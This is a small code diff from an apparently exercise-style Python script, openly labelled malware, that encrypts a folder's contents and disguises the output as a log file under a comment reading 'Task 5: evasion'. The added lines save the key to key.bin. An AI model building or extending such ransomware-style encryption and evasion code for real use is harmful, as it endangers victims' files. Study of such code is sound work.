@@ -42,6 +42,10 @@ def encrypt_folder(folder_path, password):
         encryptor = cipher.encryptor()
         with open(zip_path, 'rb') as f:
             ciphertext = iv + salt + encryptor.update(pad(f.read())) + encryptor.finalize()
+
+        # Save key separately to key.bin
+        with open('key.bin', 'wb') as key_file:
+            key_file.write(key)
         
         # Save as .log (Task 5: evasion)
         output_path = os.path.join(os.path.dirname(folder_path), 'malware_encrypted.log')
